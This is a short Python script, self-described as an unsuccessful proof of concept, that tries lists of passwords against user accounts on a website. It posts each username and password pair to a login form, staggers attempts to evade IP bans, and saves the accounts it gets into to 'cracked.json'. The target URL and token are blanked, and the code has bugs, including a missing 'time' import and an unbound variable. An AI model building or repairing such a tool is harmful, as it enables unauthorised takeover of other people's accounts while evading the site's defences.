import requests
import json
import pprint as pp
from bs4 import BeautifulSoup

# proof of concept for checking passwords against a target website
# ultimately unsuccessful

def load_file(path):
    people = []
    with open(path) as file:
        people = json.load(file)
    return(people)

def write_file(path, data):
    with open(path, 'w') as outfile:
        json.dump(data, outfile)

def main():
    people = load_file("candidates.json")
    cracked_people = []
    for person in people:
        print(person)
        for entry in person["password"]:
            time.sleep(90) # need more natural time stagger to avoid IP ban (still got one though)
            try:
                logged_in = check_credentials(person["username"], entry)
            except Exception as e:
                check_credentials(person["username"], entry)
            finally:
                if logged_in:
                    cracked_people.append(person)
    write_file("cracked.json", cracked_people)

def check_credentials(username, password):
    payload = {
        "username": username,
        "password": password,
        "csrftoken": "" # removed
    }
    login_url = "" # removed
    result = requests.post(login_url, data=payload, headers=dict(referer=login_url))
    soup = BeautifulSoup(result.content, "html.parser")
    success_identifier = soup.find_all("table", {"id": ""}) # removed
    if success_identifier:
        return True
    else:
        return False
        

if __name__ == "__main__":
    main()
